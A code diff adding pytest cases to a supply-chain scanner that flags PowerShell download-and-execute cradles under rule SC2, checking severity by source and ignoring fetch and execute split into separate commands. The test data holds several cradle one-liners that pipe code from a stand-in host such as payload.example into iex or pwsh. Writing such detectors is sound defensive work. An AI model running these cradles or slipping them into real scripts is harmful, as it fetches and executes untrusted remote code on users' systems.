@@ -77,3 +77,62 @@ def test_powershell_cradle_is_reported(
 def test_download_without_execution_is_not_sc2(content: str) -> None:
     findings = supply_chain.analyze(content, "run.ps1", "powershell")
     assert not any(finding.rule_id == "SC2" for finding in findings), content
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "irm https://data.example/status.json; 'Get-Date' | iex",
+        "Invoke-RestMethod https://data.example/status.json; \"Get-Date\" | Invoke-Expression",
+        "(New-Object Net.WebClient).DownloadString('https://data.example/a'); 'Get-Date' | iex",
+        "irm https://data.example/status.json; 'Get-Date' | pwsh",
+        "irm https://data.example/status.json; 'Get-Date' | powershell -",
+        "iex 'Get-Date'; irm https://data.example/status.json",
+        "[scriptblock]::Create('1'); irm https://data.example/status.json",
+    ],
+)
+def test_fetch_and_executor_in_separate_commands_is_not_sc2(content: str) -> None:
+    findings = supply_chain.analyze(content, "run.ps1", "powershell")
+    assert not any(finding.rule_id == "SC2" for finding in findings), content
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "irm 'https://payload.example/a;b' | iex",
+        'irm "https://payload.example/a;b" | pwsh -',
+    ],
+)
+def test_semicolon_inside_quoted_argument_stays_in_pipeline(content: str) -> None:
+    findings = [
+        f for f in supply_chain.analyze(content, "run.ps1", "powershell") if f.rule_id == "SC2"
+    ]
+    assert findings and findings[0].severity == Severity.HIGH, content
+
+
+@pytest.mark.parametrize(
+    ("template", "expected"),
+    [
+        ("irm {url} | iex", "pipe"),
+        ("iex (irm {url})", "wrapped"),
+        ("iex ((New-Object Net.WebClient).DownloadString('{url}'))", "downstring-wrapped"),
+        ("(New-Object Net.WebClient).DownloadString('{url}') | iex", "downstring-pipe"),
+        ("[scriptblock]::Create((irm {url}))", "scriptblock"),
+    ],
+)
+@pytest.mark.parametrize(
+    ("url", "severity"),
+    [
+        ("https://astral.sh/uv/install.ps1", Severity.LOW),
+        ("https://payload.example/install.ps1", Severity.HIGH),
+    ],
+)
+def test_trusted_source_policy_applies_to_every_cradle_form(
+    template: str, expected: str, url: str, severity: Severity
+) -> None:
+    content = template.format(url=url)
+    findings = [
+        f for f in supply_chain.analyze(content, "run.ps1", "powershell") if f.rule_id == "SC2"
+    ]
+    assert findings, (expected, content)
+    assert all(f.severity == severity for f in findings), (expected, content)
